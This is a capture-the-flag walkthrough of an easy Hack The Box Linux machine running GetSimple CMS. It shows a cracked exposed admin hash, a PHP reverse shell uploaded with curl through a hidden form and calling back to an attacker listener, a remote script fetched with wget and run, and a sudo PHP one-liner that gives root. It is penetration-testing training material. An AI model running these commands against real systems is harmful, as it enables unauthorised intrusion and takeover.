# GetSimple CMS — HTB Walkthrough

**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Linux
**Category:** Web Exploitation → Privilege Escalation

---

## 📋 Summary

A walkthrough of the GetSimple CMS machine on Hack The Box, chaining an exposed credentials file, a UI-hidden file upload feature, and a sudo misconfiguration to escalate from unauthenticated web access to root.

| Stage | Technique |
|---|---|
| Recon | Nmap, Gobuster |
| Foothold | Credential disclosure (`admin.xml`) + hash cracking |
| RCE | Hidden upload form abuse (PHP reverse shell) |
| Privesc | `sudo` NOPASSWD misconfiguration on `/usr/bin/php` |

---

## 🎯 Target Info

- **Target IP:** `10.129.118.166`
- **Attacker IP:** `10.10.14.250`

---

## 🔍 Reconnaissance

Started with a standard Nmap scan:

```bash
nmap -sV -sC -oA initial_scan 10.129.118.166
```

**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two open ports: SSH and a web server. The web server was the entry point.

---

## 🌐 Web Enumeration

A quick curl request confirmed the site was running **GetSimple CMS**:

```bash
curl http://10.129.118.166
```

A date on the page pointed to **2021**, which corresponded to **GetSimple CMS 3.3.16** — confirmed via Google.

Searched for known vulnerabilities for this version:

```bash
searchsploit GetSimple 3.3.16
```

This returned a known **Remote Code Execution** exploit, but exploitation required valid admin credentials.

---

## 📂 Directory Enumeration

```bash
gobuster dir -u http://10.129.118.166 -w /usr/share/seclists/Discovery/Web-content/common.txt
```

**Key findings:**
- `/robots.txt` → disclosed `/admin/`, the CMS admin login page.
- `/data/users/admin.xml` → an **exposed file** containing the admin username and a hashed password.

---

## 🔑 Getting Credentials

Retrieved the exposed file:

```
http://10.129.118.166/data/users/admin.xml
```

Cracked the password hash using [CrackStation](https://crackstation.net/) — revealing a weak, easily-guessable password.

Logged in at `/admin/` with the recovered credentials.

---

## 🐛 Finding the Vulnerability

The admin dashboard's UI does not expose an "Upload" button. Inspecting the page source revealed a functional but hidden upload form:

```html
<form class="uploadform" action="upload.php?path=" method="post" enctype="multipart/form-data">
  <input type="file" name="file[]" />
  <input type="hidden" name="hash" value="..." />
  <input type="submit" name="submit" value="Upload" />
</form>
```

Since the front-end control was missing, the same HTTP request was replicated manually with `curl`.

---

## 🐚 Gaining a Shell

1. Downloaded a trusted PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), set `IP = 10.10.14.250` and `PORT = 3388`.

2. Started a listener:
```bash
nc -lvnp 3388
```

3. Uploaded the payload via the hidden form:
```bash
curl -X POST "http://10.129.118.166/admin/upload.php?path=" \
  -H "Cookie: <session_cookie_from_login>" \
  -F "file[]=@shell.php"
```

4. Triggered execution by browsing to the uploaded file's path, causing the target to connect back to the listener.

Landed a shell as **www-data**. Stabilized it:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🚩 User Flag

```bash
cat /home/mrb3n/user.txt
```

---

## ⬆️ Privilege Escalation

Ran [LinEnum.sh](https://github.com/rebootuser/LinEnum) for automated enumeration:

```bash
# Attacker machine
python3 -m http.server 8000

# Target
cd /tmp
wget http://10.10.14.250:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Found a critical sudo misconfiguration:

```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

`www-data` could run the PHP interpreter as root, with no password required.

---

## 🏆 Getting Root

PHP's `system()` function executes arbitrary shell commands — running it via `sudo` grants a full root shell:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

Confirmed:
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

---

## 🚩 Root Flag

```
[root.txt content]
```

---

## 📝 Lessons Learned

1. **Version fingerprinting matters** — a visible date and CMS branding was enough to identify the exact vulnerable version.
2. **Sensitive files must never be web-accessible** — an exposed XML file with a crackable password hash gave away admin access entirely.
3. **Hiding a feature in the UI is not a security control** — the upload form existed in the HTML regardless of button visibility and was fully exploitable via a manual request.
4. **Least privilege for sudo rules** — granting NOPASSWD access to an interpreter (PHP, Python, Perl, etc.) is functionally equivalent to unrestricted root access.

---

## 🛠️ Tools Used

- `nmap` — port/service scanning
- `gobuster` — directory brute-forcing
- `searchsploit` — exploit research
- `curl` — manual HTTP request crafting
- `CrackStation` — hash cracking
- `LinEnum.sh` — Linux privilege escalation enumeration

---

*Completed as part of ongoing penetration testing practice on Hack The Box.*
